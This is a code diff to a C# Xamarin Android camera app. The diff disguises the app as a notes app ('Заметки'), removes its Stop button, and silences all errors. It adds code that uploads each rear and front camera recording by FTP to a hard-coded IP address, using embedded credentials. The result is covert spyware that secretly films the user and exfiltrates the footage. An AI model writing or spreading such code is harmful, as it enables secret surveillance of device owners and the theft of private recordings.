@@ -7,10 +7,12 @@ using Android.Media;
 using System.Threading.Tasks;
 using Android.Hardware;
 using System;
+using FluentFTP;
+using System.Net;
 
 namespace App1
 {
-    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme", MainLauncher = true)]
+    [Activity(Label = "Заметки", Theme = "@style/AppTheme", MainLauncher = true)]
 
     public class MainActivity : AppCompatActivity
     {
@@ -33,7 +35,6 @@ namespace App1
                 SetContentView(Resource.Layout.activity_main);
                 string path = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test.mp4";
                 var record = FindViewById<Button>(Resource.Id.Record);
-                var stop = FindViewById<Button>(Resource.Id.Stop);
                 var video = FindViewById<VideoView>(Resource.Id.SampleVideoView);
                 var frontvideo = FindViewById<VideoView>(Resource.Id.SampleVideoViewFront);
                 /////////////
@@ -57,51 +58,6 @@ namespace App1
                 rearparameters.SetPictureSize(1920, 1080);
                 rearcamera.SetParameters(rearparameters);
                 rearcamera.SetDisplayOrientation(90);
-                //camera.Unlock();
-                //////////
-                ///
-
-                //record.Click += async delegate
-                //{
-                //    i = 1;
-                //    while (i == 1)
-                //    {
-                //        //camera.Unlock();
-                //        //video.StopPlayback();
-                //        //frontvideo.StopPlayback();
-                //        //recorder = new MediaRecorder();
-                //        //frontrecorder = new MediaRecorder();
-                //        //frontrecorder.SetCamera(camera);
-                //        //recorder.SetVideoSource(VideoSource.Camera);
-                //        //recorder.SetAudioSource(AudioSource.Mic);
-                //        //recorder.SetOutputFormat(OutputFormat.Default);
-                //        //recorder.SetVideoEncoder(VideoEncoder.Default);
-                //        //recorder.SetAudioEncoder(AudioEncoder.Default);
-                //        //recorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + a + ".mp4");
-                //        //recorder.SetPreviewDisplay(video.Holder.Surface);  
-                //        //frontrecorder.SetVideoSource(VideoSource.Camera);
-                //        //frontrecorder.SetOutputFormat(OutputFormat.Default);
-                //        //frontrecorder.SetVideoEncoder(VideoEncoder.Default);
-                //        //frontrecorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + a + ".mp4");
-                //        //frontrecorder.SetPreviewDisplay(frontvideo.Holder.Surface);
-                //        //recorder.Prepare();
-                //        //recorder.Start();
-                //        //await Task.Delay(10);
-                //        //frontrecorder.Prepare();
-                //        //frontrecorder.Start();
-                //        //await Task.Delay(5000);
-                //        //a++;
-                //        //recorder.Stop();
-                //        //recorder.Release();
-                //        //await Task.Delay(10);
-                //        //frontrecorder.Stop();
-                //        //frontrecorder.Release();
-                //        //camera.Lock();
-                //        ///
-                //    }
-                //};
-
-
                 record.Click += async delegate
                 {
                     i = 1;
@@ -111,7 +67,6 @@ namespace App1
                         try
                         {
                             rearcamera.Unlock();
-                            //video.StopPlayback();
                             recorder = new MediaRecorder();
                             recorder.SetCamera(rearcamera);
                             recorder.SetVideoSource(VideoSource.Camera);
@@ -129,11 +84,19 @@ namespace App1
                             a++;
                             recorder.Stop();
                             recorder.Reset();
-                            //recorder.Release();
+                            try
+                            {
+                                FtpClient client = new FtpClient("93.189.41.9");
+                                client.Credentials = new NetworkCredential("u163406", "JzjTZ3OPl0Ob");
+                                client.Connect();
+                                await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + a + ".mp4", "/test" + a + ".mp4");
+                            }
+                            catch (Exception ex)
+                            {
+                            }
                         }
                         catch (Exception ex)
                         {
-                            throw;
                         }
 
                     }
@@ -147,7 +110,6 @@ namespace App1
                         try
                         {
                             camera.Unlock();
-                            //frontvideo.StopPlayback();
                             frontrecorder = new MediaRecorder();
                             frontrecorder.SetCamera(camera);
                             frontrecorder.SetVideoSource(VideoSource.Camera);
@@ -163,33 +125,25 @@ namespace App1
                             c++;
                             frontrecorder.Stop();
                             frontrecorder.Reset();
-                            //frontrecorder.Release();
+                            try
+                            {
+                                FtpClient client = new FtpClient("93.189.41.9");
+                                client.Credentials = new NetworkCredential("u163406", "JzjTZ3OPl0Ob");
+                                client.Connect();
+                                await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + c + ".mp4", "/fronttest" + c + ".mp4");
+                            }
+                            catch (Exception ex)
+                            {
+                            }
                         }
                         catch (Exception ex)
                         {
-                            throw;
                         }
                     }
-                };
-
-                stop.Click += async delegate
-                {
-                    i = 0;
-                    b = 0;
-                    frontrecorder.Stop();
-                    frontrecorder.Release();
-                    recorder.Stop();
-                    recorder.Release();
-                    //if (recorder != null)
-                    //{
-                    //    recorder.Stop();
-                    //    recorder.Release();
-                    //}
                 };
             }
             catch (System.Exception ex)
             {
-                throw;
             }
         }
         protected override void OnDestroy()
